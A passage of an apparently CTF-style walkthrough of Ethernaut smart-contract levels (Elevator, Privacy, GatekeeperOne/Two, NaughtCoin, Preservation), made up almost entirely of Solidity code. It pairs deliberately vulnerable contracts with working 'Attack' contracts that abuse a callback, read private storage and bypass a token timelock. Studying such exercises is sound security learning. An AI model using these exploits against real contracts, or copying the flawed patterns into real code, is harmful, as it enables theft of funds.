            top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>

    Elevator e<span class="token punctuation">;</span>
    <span class="token builtin">uint</span> <span class="token keyword">public</span> loop<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> elv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      e <span class="token operator">=</span> <span class="token function">Elevator</span><span class="token punctuation">(</span>elv<span class="token punctuation">)</span><span class="token punctuation">;</span>
      loop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>loop <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        loop <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
      e<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="privacy" tabindex="-1"><a class="header-anchor" href="#privacy" aria-hidden="true">#</a> Privacy</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Privacy</span> <span class="token punctuation">{</span>
    <span class="token builtin">bool</span> <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span>
    <span class="token builtin">uint8</span> <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token builtin">uint8</span> <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token builtin">uint16</span> <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        data <span class="token operator">=</span> _data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span> _key<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>_key <span class="token operator">==</span> <span class="token builtin">bytes16</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/*
    A bunch of super advanced solidity algorithms...

      ,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`
      .,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,
      *.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^         ,---/V\\
      \`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.    ~|__(o.o)
      ^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;^\`*.,*&#39;  UU  UU
    */</span>
<span class="token punctuation">}</span>

await web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span><span class="token function">getStorageAt</span><span class="token punctuation">(</span><span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token builtin">address</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>

<span class="token keyword">contract</span> <span class="token class-name">Attack</span><span class="token punctuation">{</span>
  Privacy  priv<span class="token punctuation">;</span>
  
  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> pv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    priv <span class="token operator">=</span> <span class="token function">Privacy</span><span class="token punctuation">(</span>pv<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  
  <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> i<span class="token punctuation">)</span> <span class="token keyword">public</span>  <span class="token punctuation">{</span>
      priv<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="gatekeeperone" tabindex="-1"><a class="header-anchor" href="#gatekeeperone" aria-hidden="true">#</a> GatekeeperOne</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">GatekeeperOne</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>

    <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">gasleft</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8191</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint32</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span><span class="token builtin">uint160</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="gatekeepertwo" tabindex="-1"><a class="header-anchor" href="#gatekeepertwo" aria-hidden="true">#</a> GatekeeperTwo</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">GatekeeperTwo</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span>

    <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin">uint256</span> x<span class="token punctuation">;</span>
        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>
            x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">_</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="naughtcoin" tabindex="-1"><a class="header-anchor" href="#naughtcoin" aria-hidden="true">#</a> NaughtCoin</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">NaughtCoin</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">{</span>
    <span class="token comment">// string public constant name = &#39;NaughtCoin&#39;;</span>
    <span class="token comment">// string public constant symbol = &#39;0x0&#39;;</span>
    <span class="token comment">// uint public constant decimals = 18;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> timeLock <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">365</span> days<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> <span class="token keyword">public</span> INITIAL_SUPPLY<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> player<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _player<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">&quot;NaughtCoin&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;0x0&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        player <span class="token operator">=</span> _player<span class="token punctuation">;</span>
        INITIAL_SUPPLY <span class="token operator">=</span> <span class="token number">1000000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// _totalSupply = INITIAL_SUPPLY;</span>
        <span class="token comment">// _balances[player] = INITIAL_SUPPLY;</span>
        <span class="token function">_mint</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">emit</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> override lockTokens <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        super<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>_to<span class="token punctuation">,</span> _value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
    <span class="token keyword">modifier</span> <span class="token function">lockTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> player<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp <span class="token operator">&gt;</span> timeLock<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">_</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">_</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

await <span class="token keyword">contract</span><span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token string">&quot;0xA1B11693760F2480583EfaEC87c73615CEF6E0fB&quot;</span><span class="token punctuation">,</span><span class="token function">BigInt</span><span class="token punctuation">(</span><span class="token number">10000000</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">contract</span> <span class="token class-name">Attack</span> <span class="token punctuation">{</span>
    <span class="token builtin">address</span> Ncoin<span class="token punctuation">;</span>
    NaughtCoin  nc<span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _nc<span class="token punctuation">)</span><span class="token punctuation">{</span>
        nc <span class="token operator">=</span> <span class="token function">NaughtCoin</span><span class="token punctuation">(</span>_nc<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>
        nc<span class="token punctuation">.</span><span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token number">0xfb0bc05F1aC61a566E70890e0e000E66F147ae66</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1000000</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        nc<span class="token punctuation">.</span><span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1000000</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">allowance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token punctuation">{</span>
        nc<span class="token punctuation">.</span><span class="token function">allowance</span><span class="token punctuation">(</span><span class="token number">0xfb0bc05F1aC61a566E70890e0e000E66F147ae66</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="preservation" tabindex="-1"><a class="header-anchor" href="#preservation" aria-hidden="true">#</a> Preservation</h2><div class="language-solidity line-numbers-mode" data-ext="solidity"><pre class="language-solidity"><code><span class="token comment">// SPDX-License-Identifier: MIT</span>
<span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span>

<span class="token keyword">contract</span> <span class="token class-name">Preservation</span> <span class="token punctuation">{</span>
    <span class="token comment">// public library contracts</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone1Library<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> timeZone2Library<span class="token punctuation">;</span>
    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>
    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span>
    <span class="token comment">// Sets the function signature for delegatecall</span>
    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> setTimeSignature <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">&quot;setTime(uint256)&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _timeZone1LibraryAddress<span class="token punctuation">,</span> <span class="token builtin">address</span> _timeZone2LibraryAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        timeZone1Library <span class="token operator">=</span> _timeZone1LibraryAddress<span class="token punctuation">;</span>
        timeZone2Library <span class="token operator">=</span> _timeZone2LibraryAddress<span class="token punctuation">;</span>
        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// set the time for timezone 1</span>
    <span class="token keyword">function</span> <span class="token function">setFirstTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        timeZone1Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// set the time for timezone 2</span>
    <span class="token keyword">function</span> <span class="token function">setSecondTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _timeStamp<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        timeZone2Library<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>setTimeSignature<span class="token punctuation">,</span> _timeStamp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Simple library contract to set the time</span>
<span class="token keyword">contract</span> <span class="token class-name">LibraryContract</span> <span class="token punctuation">{</span>
    <span class="token comment">// stores a timestamp</span>
    <span class="token builtin">uint256</span> storedTime<span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">setTime</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _time<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
        storedTime <span class="token operator">=</span> _time<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
